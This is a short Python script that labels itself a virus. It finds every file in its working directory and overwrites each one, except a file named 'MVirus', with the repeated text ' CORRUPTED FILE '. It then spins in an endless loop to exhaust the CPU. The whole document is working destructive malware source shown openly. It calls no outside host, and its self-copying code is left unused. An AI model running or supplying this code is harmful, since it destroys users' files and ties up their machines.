#VStart
#!/usr/bin/python3

import sys
import glob
import os

virusCode = []

# open file and read all lines
# filter out lines that aren't in code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "rb")
lines = virusFile.readlines()
virusFile.close()


# Find victims to infect with the virus
# glob is used for searching of files
programsToInfect = glob.glob("*")

print("LOCATED : ")
print(programsToInfect)


#start infecting
for program in programsToInfect:
    if (program != "MVirus"):    
        #newCodeInfected = programLines
        newCodeInfected =  10* " CORRUPTED FILE \n"
        print(" VIRUS INFECTED FILE " + program )

        File = open(program,"wb")
        File.write(newCodeInfected.encode('utf-8'))
        File.close()

#payload (Problem that virus will cause)
#NOTHING

pid=os.getpid()
print(pid)

#EXHAUST CPU
while True:
    pass

#VEnd